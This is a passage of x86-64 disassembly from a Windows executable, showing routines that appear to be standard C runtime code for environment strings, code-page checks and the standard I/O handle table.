   140007946:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   14000794c:	41 0f a3 c0          	bt     %eax,%r8d
   140007950:	72 33                	jb     0x140007985
   140007952:	83 f9 2a             	cmp    $0x2a,%ecx
   140007955:	eb 26                	jmp    0x14000797d
   140007957:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   14000795d:	74 26                	je     0x140007985
   14000795f:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140007965:	76 18                	jbe    0x14000797f
   140007967:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   14000796d:	76 16                	jbe    0x140007985
   14000796f:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140007975:	74 0e                	je     0x140007985
   140007977:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000797d:	74 06                	je     0x140007985
   14000797f:	0f ba f2 07          	btr    $0x7,%edx
   140007983:	eb 02                	jmp    0x140007987
   140007985:	8b d7                	mov    %edi,%edx
   140007987:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000798c:	45 84 d2             	test   %r10b,%r10b
   14000798f:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140007994:	4c 8b c0             	mov    %rax,%r8
   140007997:	4c 0f 45 c7          	cmovne %rdi,%r8
   14000799b:	4c 0f 45 cf          	cmovne %rdi,%r9
   14000799f:	74 07                	je     0x1400079a8
   1400079a1:	48 85 c0             	test   %rax,%rax
   1400079a4:	74 02                	je     0x1400079a8
   1400079a6:	89 38                	mov    %edi,(%rax)
   1400079a8:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1400079ad:	4c 8b c3             	mov    %rbx,%r8
   1400079b0:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1400079b5:	45 8b cb             	mov    %r11d,%r9d
   1400079b8:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1400079bd:	5f                   	pop    %rdi
   1400079be:	48 ff 25 8b 56 00 00 	rex.W jmp *0x568b(%rip)        # 0x14000d050
   1400079c5:	cc                   	int3
   1400079c6:	cc                   	int3
   1400079c7:	cc                   	int3
   1400079c8:	48 8b c4             	mov    %rsp,%rax
   1400079cb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400079cf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400079d3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400079d7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400079db:	41 56                	push   %r14
   1400079dd:	48 83 ec 40          	sub    $0x40,%rsp
   1400079e1:	ff 15 39 58 00 00    	call   *0x5839(%rip)        # 0x14000d220
   1400079e7:	45 33 f6             	xor    %r14d,%r14d
   1400079ea:	48 8b d8             	mov    %rax,%rbx
   1400079ed:	48 85 c0             	test   %rax,%rax
   1400079f0:	0f 84 a4 00 00 00    	je     0x140007a9a
   1400079f6:	48 8b f0             	mov    %rax,%rsi
   1400079f9:	66 44 39 30          	cmp    %r14w,(%rax)
   1400079fd:	74 1c                	je     0x140007a1b
   1400079ff:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007a03:	48 ff c0             	inc    %rax
   140007a06:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   140007a0b:	75 f6                	jne    0x140007a03
   140007a0d:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   140007a11:	48 83 c6 02          	add    $0x2,%rsi
   140007a15:	66 44 39 36          	cmp    %r14w,(%rsi)
   140007a19:	75 e4                	jne    0x1400079ff
   140007a1b:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007a20:	48 2b f3             	sub    %rbx,%rsi
   140007a23:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007a28:	48 83 c6 02          	add    $0x2,%rsi
   140007a2c:	48 d1 fe             	sar    $1,%rsi
   140007a2f:	4c 8b c3             	mov    %rbx,%r8
   140007a32:	44 8b ce             	mov    %esi,%r9d
   140007a35:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140007a3a:	33 d2                	xor    %edx,%edx
   140007a3c:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140007a41:	33 c9                	xor    %ecx,%ecx
   140007a43:	e8 d0 fe ff ff       	call   0x140007918
   140007a48:	48 63 e8             	movslq %eax,%rbp
   140007a4b:	85 c0                	test   %eax,%eax
   140007a4d:	74 4b                	je     0x140007a9a
   140007a4f:	48 8b cd             	mov    %rbp,%rcx
   140007a52:	e8 41 e6 ff ff       	call   0x140006098
   140007a57:	48 8b f8             	mov    %rax,%rdi
   140007a5a:	48 85 c0             	test   %rax,%rax
   140007a5d:	74 2e                	je     0x140007a8d
   140007a5f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007a64:	44 8b ce             	mov    %esi,%r9d
   140007a67:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007a6c:	4c 8b c3             	mov    %rbx,%r8
   140007a6f:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140007a73:	33 d2                	xor    %edx,%edx
   140007a75:	33 c9                	xor    %ecx,%ecx
   140007a77:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007a7c:	e8 97 fe ff ff       	call   0x140007918
   140007a81:	85 c0                	test   %eax,%eax
   140007a83:	74 08                	je     0x140007a8d
   140007a85:	48 8b f7             	mov    %rdi,%rsi
   140007a88:	49 8b fe             	mov    %r14,%rdi
   140007a8b:	eb 03                	jmp    0x140007a90
   140007a8d:	49 8b f6             	mov    %r14,%rsi
   140007a90:	48 8b cf             	mov    %rdi,%rcx
   140007a93:	e8 d8 e6 ff ff       	call   0x140006170
   140007a98:	eb 03                	jmp    0x140007a9d
   140007a9a:	49 8b f6             	mov    %r14,%rsi
   140007a9d:	48 85 db             	test   %rbx,%rbx
   140007aa0:	74 09                	je     0x140007aab
   140007aa2:	48 8b cb             	mov    %rbx,%rcx
   140007aa5:	ff 15 7d 57 00 00    	call   *0x577d(%rip)        # 0x14000d228
   140007aab:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007ab0:	48 8b c6             	mov    %rsi,%rax
   140007ab3:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007ab8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007abd:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140007ac2:	48 83 c4 40          	add    $0x40,%rsp
   140007ac6:	41 5e                	pop    %r14
   140007ac8:	c3                   	ret
   140007ac9:	cc                   	int3
   140007aca:	cc                   	int3
   140007acb:	cc                   	int3
   140007acc:	40 53                	rex push %rbx
   140007ace:	48 83 ec 20          	sub    $0x20,%rsp
   140007ad2:	33 db                	xor    %ebx,%ebx
   140007ad4:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007ad8:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140007adf:	00 00 
   140007ae1:	48 8b 48 20          	mov    0x20(%rax),%rcx
   140007ae5:	39 59 08             	cmp    %ebx,0x8(%rcx)
   140007ae8:	7c 11                	jl     0x140007afb
   140007aea:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007aef:	e8 94 e0 ff ff       	call   0x140005b88
   140007af4:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140007af9:	74 05                	je     0x140007b00
   140007afb:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007b00:	8b c3                	mov    %ebx,%eax
   140007b02:	48 83 c4 20          	add    $0x20,%rsp
   140007b06:	5b                   	pop    %rbx
   140007b07:	c3                   	ret
   140007b08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b0d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007b12:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007b17:	57                   	push   %rdi
   140007b18:	48 83 ec 20          	sub    $0x20,%rsp
   140007b1c:	ba 48 00 00 00       	mov    $0x48,%edx
   140007b21:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140007b24:	e8 cf e5 ff ff       	call   0x1400060f8
   140007b29:	33 f6                	xor    %esi,%esi
   140007b2b:	48 8b d8             	mov    %rax,%rbx
   140007b2e:	48 85 c0             	test   %rax,%rax
   140007b31:	74 5b                	je     0x140007b8e
   140007b33:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   140007b3a:	48 3b c5             	cmp    %rbp,%rax
   140007b3d:	74 4c                	je     0x140007b8b
   140007b3f:	48 8d 78 30          	lea    0x30(%rax),%rdi
   140007b43:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140007b47:	45 33 c0             	xor    %r8d,%r8d
   140007b4a:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140007b4f:	e8 ec e1 ff ff       	call   0x140005d40
   140007b54:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140007b59:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   140007b5d:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140007b61:	8b c6                	mov    %esi,%eax
   140007b63:	48 89 37             	mov    %rsi,(%rdi)
   140007b66:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   140007b6d:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140007b71:	40 88 31             	mov    %sil,(%rcx)
   140007b74:	ff c0                	inc    %eax
   140007b76:	48 ff c1             	inc    %rcx
   140007b79:	83 f8 05             	cmp    $0x5,%eax
   140007b7c:	72 f3                	jb     0x140007b71
   140007b7e:	48 83 c7 48          	add    $0x48,%rdi
   140007b82:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140007b86:	48 3b c5             	cmp    %rbp,%rax
   140007b89:	75 b8                	jne    0x140007b43
   140007b8b:	48 8b f3             	mov    %rbx,%rsi
   140007b8e:	33 c9                	xor    %ecx,%ecx
   140007b90:	e8 db e5 ff ff       	call   0x140006170
   140007b95:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b9a:	48 8b c6             	mov    %rsi,%rax
   140007b9d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007ba2:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007ba7:	48 83 c4 20          	add    $0x20,%rsp
   140007bab:	5f                   	pop    %rdi
   140007bac:	c3                   	ret
   140007bad:	cc                   	int3
   140007bae:	cc                   	int3
   140007baf:	cc                   	int3
   140007bb0:	48 85 c9             	test   %rcx,%rcx
   140007bb3:	74 4a                	je     0x140007bff
   140007bb5:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007bba:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007bbf:	57                   	push   %rdi
   140007bc0:	48 83 ec 20          	sub    $0x20,%rsp
   140007bc4:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140007bcb:	48 8b d9             	mov    %rcx,%rbx
   140007bce:	48 8b f9             	mov    %rcx,%rdi
   140007bd1:	48 3b ce             	cmp    %rsi,%rcx
   140007bd4:	74 12                	je     0x140007be8
   140007bd6:	48 8b cf             	mov    %rdi,%rcx
   140007bd9:	ff 15 81 55 00 00    	call   *0x5581(%rip)        # 0x14000d160
   140007bdf:	48 83 c7 48          	add    $0x48,%rdi
   140007be3:	48 3b fe             	cmp    %rsi,%rdi
   140007be6:	75 ee                	jne    0x140007bd6
   140007be8:	48 8b cb             	mov    %rbx,%rcx
   140007beb:	e8 80 e5 ff ff       	call   0x140006170
   140007bf0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007bf5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007bfa:	48 83 c4 20          	add    $0x20,%rsp
   140007bfe:	5f                   	pop    %rdi
   140007bff:	c3                   	ret
   140007c00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c05:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007c0a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007c0f:	41 57                	push   %r15
   140007c11:	48 83 ec 30          	sub    $0x30,%rsp
   140007c15:	8b f1                	mov    %ecx,%esi
   140007c17:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140007c1d:	72 29                	jb     0x140007c48
   140007c1f:	e8 6c dd ff ff       	call   0x140005990
   140007c24:	bb 09 00 00 00       	mov    $0x9,%ebx
   140007c29:	89 18                	mov    %ebx,(%rax)
   140007c2b:	e8 40 dc ff ff       	call   0x140005870
   140007c30:	8b c3                	mov    %ebx,%eax
   140007c32:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007c37:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140007c3c:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140007c41:	48 83 c4 30          	add    $0x30,%rsp
   140007c45:	41 5f                	pop    %r15
   140007c47:	c3                   	ret
   140007c48:	33 ff                	xor    %edi,%edi
   140007c4a:	8d 4f 07             	lea    0x7(%rdi),%ecx
   140007c4d:	e8 d6 e3 ff ff       	call   0x140006028
   140007c52:	90                   	nop
   140007c53:	8b df                	mov    %edi,%ebx
   140007c55:	8b 05 75 0f 01 00    	mov    0x10f75(%rip),%eax        # 0x140018bd0
   140007c5b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007c60:	3b f0                	cmp    %eax,%esi
   140007c62:	7c 36                	jl     0x140007c9a
   140007c64:	4c 8d 3d 65 0b 01 00 	lea    0x10b65(%rip),%r15        # 0x1400187d0
   140007c6b:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140007c6f:	74 02                	je     0x140007c73
   140007c71:	eb 22                	jmp    0x140007c95
   140007c73:	e8 90 fe ff ff       	call   0x140007b08
   140007c78:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140007c7c:	48 85 c0             	test   %rax,%rax
   140007c7f:	75 05                	jne    0x140007c86
   140007c81:	8d 78 0c             	lea    0xc(%rax),%edi
   140007c84:	eb 14                	jmp    0x140007c9a
   140007c86:	8b 05 44 0f 01 00    	mov    0x10f44(%rip),%eax        # 0x140018bd0
   140007c8c:	83 c0 40             	add    $0x40,%eax
   140007c8f:	89 05 3b 0f 01 00    	mov    %eax,0x10f3b(%rip)        # 0x140018bd0
   140007c95:	48 ff c3             	inc    %rbx
   140007c98:	eb c1                	jmp    0x140007c5b
   140007c9a:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007c9f:	e8 d8 e3 ff ff       	call   0x14000607c
   140007ca4:	8b c7                	mov    %edi,%eax
   140007ca6:	eb 8a                	jmp    0x140007c32
   140007ca8:	48 63 d1             	movslq %ecx,%rdx
   140007cab:	4c 8d 05 1e 0b 01 00 	lea    0x10b1e(%rip),%r8        # 0x1400187d0
   140007cb2:	48 8b c2             	mov    %rdx,%rax
   140007cb5:	83 e2 3f             	and    $0x3f,%edx
   140007cb8:	48 c1 f8 06          	sar    $0x6,%rax
   140007cbc:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007cc0:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007cc4:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007cc8:	48 ff 25 81 54 00 00 	rex.W jmp *0x5481(%rip)        # 0x14000d150
   140007ccf:	cc                   	int3
   140007cd0:	48 63 d1             	movslq %ecx,%rdx
   140007cd3:	4c 8d 05 f6 0a 01 00 	lea    0x10af6(%rip),%r8        # 0x1400187d0
   140007cda:	48 8b c2             	mov    %rdx,%rax
   140007cdd:	83 e2 3f             	and    $0x3f,%edx
   140007ce0:	48 c1 f8 06          	sar    $0x6,%rax
   140007ce4:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007ce8:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007cec:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007cf0:	48 ff 25 61 54 00 00 	rex.W jmp *0x5461(%rip)        # 0x14000d158
   140007cf7:	cc                   	int3
   140007cf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007cfd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007d02:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007d07:	41 56                	push   %r14
   140007d09:	48 83 ec 20          	sub    $0x20,%rsp
   140007d0d:	48 63 d9             	movslq %ecx,%rbx
   140007d10:	85 c9                	test   %ecx,%ecx
   140007d12:	78 72                	js     0x140007d86
   140007d14:	3b 1d b6 0e 01 00    	cmp    0x10eb6(%rip),%ebx        # 0x140018bd0
   140007d1a:	73 6a                	jae    0x140007d86
   140007d1c:	48 8b c3             	mov    %rbx,%rax
   140007d1f:	4c 8d 35 aa 0a 01 00 	lea    0x10aaa(%rip),%r14        # 0x1400187d0
   140007d26:	83 e0 3f             	and    $0x3f,%eax
   140007d29:	48 8b f3             	mov    %rbx,%rsi
   140007d2c:	48 c1 fe 06          	sar    $0x6,%rsi
   140007d30:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140007d34:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140007d38:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140007d3d:	74 47                	je     0x140007d86
   140007d3f:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140007d45:	74 3f                	je     0x140007d86
   140007d47:	e8 d4 bf ff ff       	call   0x140003d20
   140007d4c:	83 f8 01             	cmp    $0x1,%eax
   140007d4f:	75 27                	jne    0x140007d78
   140007d51:	85 db                	test   %ebx,%ebx
   140007d53:	74 16                	je     0x140007d6b
   140007d55:	2b d8                	sub    %eax,%ebx
   140007d57:	74 0b                	je     0x140007d64
   140007d59:	3b d8                	cmp    %eax,%ebx
   140007d5b:	75 1b                	jne    0x140007d78
   140007d5d:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007d62:	eb 0c                	jmp    0x140007d70
   140007d64:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140007d69:	eb 05                	jmp    0x140007d70
   140007d6b:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140007d70:	33 d2                	xor    %edx,%edx
   140007d72:	ff 15 b8 54 00 00    	call   *0x54b8(%rip)        # 0x14000d230
   140007d78:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140007d7c:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140007d82:	33 c0                	xor    %eax,%eax
   140007d84:	eb 16                	jmp    0x140007d9c
   140007d86:	e8 05 dc ff ff       	call   0x140005990
   140007d8b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007d91:	e8 da db ff ff       	call   0x140005970
   140007d96:	83 20 00             	andl   $0x0,(%rax)
   140007d99:	83 c8 ff             	or     $0xffffffff,%eax
   140007d9c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007da1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007da6:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140007dab:	48 83 c4 20          	add    $0x20,%rsp
   140007daf:	41 5e                	pop    %r14
   140007db1:	c3                   	ret
   140007db2:	cc                   	int3
   140007db3:	cc                   	int3
   140007db4:	48 83 ec 28          	sub    $0x28,%rsp
   140007db8:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140007dbb:	75 15                	jne    0x140007dd2
   140007dbd:	e8 ae db ff ff       	call   0x140005970
   140007dc2:	83 20 00             	andl   $0x0,(%rax)
   140007dc5:	e8 c6 db ff ff       	call   0x140005990
   140007dca:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007dd0:	eb 4e                	jmp    0x140007e20
   140007dd2:	85 c9                	test   %ecx,%ecx
   140007dd4:	78 32                	js     0x140007e08
   140007dd6:	3b 0d f4 0d 01 00    	cmp    0x10df4(%rip),%ecx        # 0x140018bd0
   140007ddc:	73 2a                	jae    0x140007e08
   140007dde:	48 63 c9             	movslq %ecx,%rcx
   140007de1:	4c 8d 05 e8 09 01 00 	lea    0x109e8(%rip),%r8        # 0x1400187d0
   140007de8:	48 8b c1             	mov    %rcx,%rax
   140007deb:	83 e1 3f             	and    $0x3f,%ecx
   140007dee:	48 c1 f8 06          	sar    $0x6,%rax
   140007df2:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   140007df6:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007dfa:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140007dff:	74 07                	je     0x140007e08
   140007e01:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   140007e06:	eb 1c                	jmp    0x140007e24
   140007e08:	e8 63 db ff ff       	call   0x140005970
   140007e0d:	83 20 00             	andl   $0x0,(%rax)
   140007e10:	e8 7b db ff ff       	call   0x140005990
   140007e15:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007e1b:	e8 50 da ff ff       	call   0x140005870
   140007e20:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007e24:	48 83 c4 28          	add    $0x28,%rsp
   140007e28:	c3                   	ret
   140007e29:	cc                   	int3
   140007e2a:	cc                   	int3
   140007e2b:	cc                   	int3
   140007e2c:	8b 05 96 09 01 00    	mov    0x10996(%rip),%eax        # 0x1400187c8
   140007e32:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140007e37:	85 c0                	test   %eax,%eax
   140007e39:	0f 44 c1             	cmove  %ecx,%eax
   140007e3c:	89 05 86 09 01 00    	mov    %eax,0x10986(%rip)        # 0x1400187c8
   140007e42:	33 c0                	xor    %eax,%eax
   140007e44:	c3                   	ret
   140007e45:	cc                   	int3
   140007e46:	cc                   	int3
   140007e47:	cc                   	int3
   140007e48:	48 8b c4             	mov    %rsp,%rax
   140007e4b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007e4f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007e53:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007e57:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007e5b:	41 56                	push   %r14
   140007e5d:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140007e64:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140007e68:	ff 15 ba 52 00 00    	call   *0x52ba(%rip)        # 0x14000d128
   140007e6e:	45 33 f6             	xor    %r14d,%r14d
   140007e71:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140007e77:	0f 84 9a 00 00 00    	je     0x140007f17
   140007e7d:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140007e82:	48 85 c0             	test   %rax,%rax
   140007e85:	0f 84 8c 00 00 00    	je     0x140007f17
   140007e8b:	48 63 18             	movslq (%rax),%rbx
   140007e8e:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140007e92:	bf 00 20 00 00       	mov    $0x2000,%edi
   140007e97:	48 03 de             	add    %rsi,%rbx
   140007e9a:	39 38                	cmp    %edi,(%rax)
   140007e9c:	0f 4c 38             	cmovl  (%rax),%edi
   140007e9f:	8b cf                	mov    %edi,%ecx
   140007ea1:	e8 5a fd ff ff       	call   0x140007c00
   140007ea6:	3b 3d 24 0d 01 00    	cmp    0x10d24(%rip),%edi        # 0x140018bd0
   140007eac:	0f 4f 3d 1d 0d 01 00 	cmovg  0x10d1d(%rip),%edi        # 0x140018bd0
   140007eb3:	85 ff                	test   %edi,%edi
   140007eb5:	74 60                	je     0x140007f17
   140007eb7:	41 8b ee             	mov    %r14d,%ebp
   140007eba:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140007ebe:	74 47                	je     0x140007f07
   140007ec0:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140007ec4:	74 41                	je     0x140007f07
   140007ec6:	f6 06 01             	testb  $0x1,(%rsi)
   140007ec9:	74 3c                	je     0x140007f07
   140007ecb:	f6 06 08             	testb  $0x8,(%rsi)
   140007ece:	75 0d                	jne    0x140007edd
   140007ed0:	48 8b 0b             	mov    (%rbx),%rcx
   140007ed3:	ff 15 5f 53 00 00    	call   *0x535f(%rip)        # 0x14000d238
   140007ed9:	85 c0                	test   %eax,%eax
   140007edb:	74 2a                	je     0x140007f07
   140007edd:	48 8b c5             	mov    %rbp,%rax
   140007ee0:	4c 8d 05 e9 08 01 00 	lea    0x108e9(%rip),%r8        # 0x1400187d0
   140007ee7:	48 8b cd             	mov    %rbp,%rcx
   140007eea:	48 c1 f9 06          	sar    $0x6,%rcx
   140007eee:	83 e0 3f             	and    $0x3f,%eax
   140007ef1:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140007ef5:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140007ef9:	48 8b 03             	mov    (%rbx),%rax
   140007efc:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140007f01:	8a 06                	mov    (%rsi),%al
   140007f03:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140007f07:	48 ff c5             	inc    %rbp
   140007f0a:	48 ff c6             	inc    %rsi
   140007f0d:	48 83 c3 08          	add    $0x8,%rbx
   140007f11:	48 83 ef 01          	sub    $0x1,%rdi
   140007f15:	75 a3                	jne    0x140007eba
   140007f17:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140007f1e:	00 
   140007f1f:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140007f23:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140007f27:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140007f2b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140007f2f:	49 8b e3             	mov    %r11,%rsp
   140007f32:	41 5e                	pop    %r14
   140007f34:	c3                   	ret
   140007f35:	cc                   	int3
   140007f36:	cc                   	int3
   140007f37:	cc                   	int3
   140007f38:	48 8b c4             	mov    %rsp,%rax
   140007f3b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007f3f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007f43:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007f47:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007f4b:	41 56                	push   %r14
   140007f4d:	48 83 ec 20          	sub    $0x20,%rsp
   140007f51:	33 f6                	xor    %esi,%esi
   140007f53:	45 33 f6             	xor    %r14d,%r14d
   140007f56:	48 63 ce             	movslq %esi,%rcx
   140007f59:	48 8d 3d 70 08 01 00 	lea    0x10870(%rip),%rdi        # 0x1400187d0
   140007f60:	48 8b c1             	mov    %rcx,%rax
   140007f63:	83 e1 3f             	and    $0x3f,%ecx
   140007f66:	48 c1 f8 06          	sar    $0x6,%rax
   140007f6a:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140007f6e:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140007f72:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140007f77:	48 83 c0 02          	add    $0x2,%rax
   140007f7b:	48 83 f8 01          	cmp    $0x1,%rax
   140007f7f:	76 0a                	jbe    0x140007f8b
   140007f81:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140007f86:	e9 8f 00 00 00       	jmp    0x14000801a
   140007f8b:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140007f90:	8b ce                	mov    %esi,%ecx
   140007f92:	85 f6                	test   %esi,%esi
   140007f94:	74 16                	je     0x140007fac
   140007f96:	83 e9 01             	sub    $0x1,%ecx
   140007f99:	74 0a                	je     0x140007fa5
   140007f9b:	83 f9 01             	cmp    $0x1,%ecx
   140007f9e:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007fa3:	eb 0c                	jmp    0x140007fb1
   140007fa5:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140007faa:	eb 05                	jmp    0x140007fb1
   140007fac:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140007fb1:	ff 15 e1 51 00 00    	call   *0x51e1(%rip)        # 0x14000d198
   140007fb7:	48 8b e8             	mov    %rax,%rbp
   140007fba:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140007fbe:	48 83 f9 01          	cmp    $0x1,%rcx
   140007fc2:	76 0b                	jbe    0x140007fcf
   140007fc4:	48 8b c8             	mov    %rax,%rcx
   140007fc7:	ff 15 6b 52 00 00    	call   *0x526b(%rip)        # 0x14000d238
   140007fcd:	eb 02                	jmp    0x140007fd1
   140007fcf:	33 c0                	xor    %eax,%eax
   140007fd1:	85 c0                	test   %eax,%eax
   140007fd3:	74 20                	je     0x140007ff5
   140007fd5:	0f b6 c8             	movzbl %al,%ecx
   140007fd8:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140007fdd:	83 f9 02             	cmp    $0x2,%ecx
   140007fe0:	75 07                	jne    0x140007fe9
   140007fe2:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007fe7:	eb 31                	jmp    0x14000801a
   140007fe9:	83 f9 03             	cmp    $0x3,%ecx
   140007fec:	75 2c                	jne    0x14000801a
   140007fee:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140007ff3:	eb 25                	jmp    0x14000801a
   140007ff5:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007ffa:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140008001:	ff ff 
   140008003:	48 8b 05 06 0c 01 00 	mov    0x10c06(%rip),%rax        # 0x140018c10
   14000800a:	48 85 c0             	test   %rax,%rax
